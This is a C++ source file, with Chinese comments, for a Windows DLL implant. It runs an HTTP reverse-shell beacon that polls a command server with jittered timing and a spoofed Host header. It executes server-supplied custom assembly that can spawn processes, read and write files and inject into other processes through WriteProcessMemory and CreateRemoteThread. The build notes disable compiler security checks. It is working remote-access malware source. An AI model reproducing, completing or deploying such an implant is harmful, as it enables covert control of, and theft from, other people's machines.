#include "pch.h"
#include <iostream>
#include "single_include/nlohmann/json.hpp"

#include "Cryptor.h"
#include "HttpConnect.h"
#include "Interpreter.h"
#include "ReflectiveLoader.h"
#include "CommandController.h"

using namespace std;
using json = nlohmann::json;

/*
* ⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
* 1.Release
* 2.C/C++
* 常规: 附加包含目录($(ProjectDir)json-3.11.3)、SDL检查(否)
* 优化: 优化(已禁用)
* 代码生成: 运行库(多线程)、安全检查(禁用安全检查)
* 3.链接器
* 清单文件: 生成清单(否)
* 调试: 生成调试信息(否)
*/

// HTTP 反向 Shell
int MagicShell(PBYTE jmpAddr) {
    srand(time(NULL));

    // 加密反射 DLL
    RefDllInfo refDllInfo = EncryptReflectiveDll(jmpAddr);

    // 连接信息
    char host[] = "127.0.0.1";
    int port = 1234;
    char requestHeader[] =
        "POST / HTTP/1.1\r\n"
        "Host: www.google.com.hk\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Connection: close\r\n"
        "Content-Length: ";

    string sessionType = "session";
    string fid = "[FID]"; // 文件ID
    string sid = to_string(rand() % 10000000); // 会话ID (数据库主键，不保证重复)

    double iniHeartbeat = 1.5; // 基础心跳
    double heartbeatDevMax = 0.5; // 心跳偏移

    vector<SelfAsmInfo> selfAsmInfoVector; // 自定义汇编信息列表

    vector<ConnectData> commandDataVector; // 命令数据列表
    vector<ConnectData> commandOutputDataVector; // 命令输出数据列表

    // 构造会话信息
    SessionInfo sessionInfo = GetSessionInfo(sessionType, fid, sid);

    while (1) {
        // 睡眠
        double heartbeatDev = ((double)rand() / RAND_MAX) * heartbeatDevMax * 2 - heartbeatDevMax;
        Sleep((iniHeartbeat + heartbeatDev) * 1000);

        // 构造会话数据
        string sessionData = GetSessionData(sessionInfo, selfAsmInfoVector, commandOutputDataVector);

        // HTTP 请求
        string responseData = HttpRequest(host, port, requestHeader, sessionData);
        if (responseData != "") {
            // 解析命令数据列表: [{命令ID:xxx, 自定义汇编/哈希:xxx, 自定义汇编函数参数:xxx}, ...]
            commandDataVector = json::parse(responseData);
            // 命令数据 <- 命令数据队列
            for (ConnectData commandData : commandDataVector) {
                // 调用解释器
                int commandParaLength = commandData.paraHex.length() / 2;
                char* commandPara = HexToBin(commandData.paraHex);
                string selfAsm = GetSelfAsm(commandData.data, selfAsmInfoVector);
                char* outputData;
                int outputDataLength;
                PVOID funcAddr[] = { malloc, realloc, free, strlen, strtol, ((errno_t(*)(char*, rsize_t, const char*))strcpy_s), ((int(*)(char*, size_t, const char*, ...))sprintf_s), CloseHandle, CreateProcessA, CreatePipe, ReadFile, FindFirstFileA, FindNextFileA, FindClose, GetFullPathNameA, FileTimeToLocalFileTime, FileTimeToSystemTime, strtoull, fopen_s, _fseeki64, fread, fwrite, fclose, CopyFileA, rename, ((int(*)(const char*))remove), CreateDirectoryA, &refDllInfo, OpenProcess, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory, CreateRemoteThread };
                MagicInvoke((char*)selfAsm.c_str(), commandPara, commandParaLength, &outputData, &outputDataLength, funcAddr);
                free(commandPara);
                // 构造命令输出数据: {命令ID: xxx, 输出数据Hex: xxx, paraHex:}
                string outputDataHex = BinToHex(outputData, outputDataLength);
                free(outputData);
                ConnectData commandOutputData = { commandData.commandId, "", outputDataHex };
                // 命令输出数据 -> 命令输出数据队列
                commandOutputDataVector.push_back(commandOutputData);
            }
            commandDataVector.clear();
        }
    }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        if (MagicShell((PBYTE)hModule)) {
            ReflectiveLoader(NULL);
        }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}